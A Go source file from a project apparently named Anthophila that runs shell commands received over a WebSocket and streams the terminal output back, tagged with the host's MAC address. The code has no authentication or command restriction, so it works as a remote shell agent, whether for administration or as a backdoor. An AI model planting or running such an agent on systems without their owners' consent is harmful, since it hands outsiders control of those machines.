package management

import (
	"Anthophila/information"
	"Anthophila/logging"
	"Anthophila/terminal"
	"encoding/json"
	"github.com/gorilla/websocket"
	"log"
	"strings"
)

type Reader struct{}

func NewReader() *Reader {
	return new(Reader)
}

// ReadMessage Обробка отриманих повідомлень
func (r *Reader) ReadMessage(ws *websocket.Conn) {
	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			logging.Now().PrintLog("Error reading message: %v", err.Error())
			return
		}
		logging.Now().PrintLog("Received: ", string(message))
	}
}

type Command struct {
	SClient string `json:"sClient"`
	Command string `json:"command"`
}

var cmd Command

type myMessage struct {
	SClient string `json:"sClient"`
	RClient string `json:"rClient"`
	Message string `json:"message"`
}

// ReadMessageCommand Обробка отриманих команд через WebSocket
func (r *Reader) ReadMessageCommand(wSocket *websocket.Conn) {

	term := terminal.NewTerminalManager()
	if err := term.Start(); err != nil {
		logging.Now().PrintLog("Failed to start terminal: ", err.Error())
	} else {
		Terminal(wSocket, term)
	}

	for {
		_, message, err := wSocket.ReadMessage()
		if err != nil {
			logging.Now().PrintLog("Error reading message: ", err.Error())
			return
		}

		if err := json.Unmarshal(message, &cmd); err != nil {
			// Якщо розпарсити як JSON не вдалося, обробляємо як звичайний текст
			logging.Now().PrintLog("Received text message:", string(message))
		} else {
			// Якщо розпарсити вдалося, працюємо з даними
			if cmd.Command == "help" {
				// Заповнення внутрішньої структури
				msg := myMessage{
					SClient: information.NewInfo().GetMACAddress(),
					RClient: cmd.SClient,
					Message: "Ми отримали від вас повідомлення. Наше ім'я: " + information.NewInfo().GetMACAddress() + ". Ваше повідомлення: " + string(message),
				}

				// Серіалізація в JSON
				jsonData, err := json.Marshal(msg)
				if err != nil {
					logging.Now().PrintLog("Error marshalling JSON:", err.Error())
					continue
				}
				log.Println("Json " + string(jsonData))
				if err := NewSender().sendMessageWith(wSocket, jsonData); err != nil {
					logging.Now().PrintLog("Error sending message:", err.Error())
				}
			} else {
				// Основний TerminalManager() для взаємодії з користувачем терміналом
				if strings.TrimSpace(cmd.Command) == "restart" || strings.TrimSpace(cmd.Command) == "exit" {
					term.Stop()
					managerTerm := terminal.NewTerminalManager()
					if err := managerTerm.Start(); err != nil {
						logging.Now().PrintLog("Failed to start terminal: %v", err.Error())
					} else {
						term = managerTerm
						Terminal(wSocket, term)
					}
					continue
				}
				term.SendCommand(cmd.Command)

			}
		}
	}
}

// Terminal Запускає горутину для обробки виходу термінала
func Terminal(wSocket *websocket.Conn, term *terminal.TerminalManager) {
	// Запускаємо горутину для обробки виходу термінала
	go func() {
		for line := range term.GetOutput() {
			msg := myMessage{
				SClient: information.NewInfo().GetMACAddress(),
				RClient: cmd.SClient,
				Message: "{terminal:{" + strings.Trim(line, "\n") + "}}",
			}
			jsonData, err := json.Marshal(msg)
			if err != nil {
				logging.Now().PrintLog("Error marshalling JSON:", err.Error())
				continue
			}
			logging.Now().PrintLog("Json ", string(jsonData))
			if err := NewSender().sendMessageWith(wSocket, jsonData); err != nil {
				logging.Now().PrintLog("Error sending message:", err.Error())
			}
		}
	}()
}
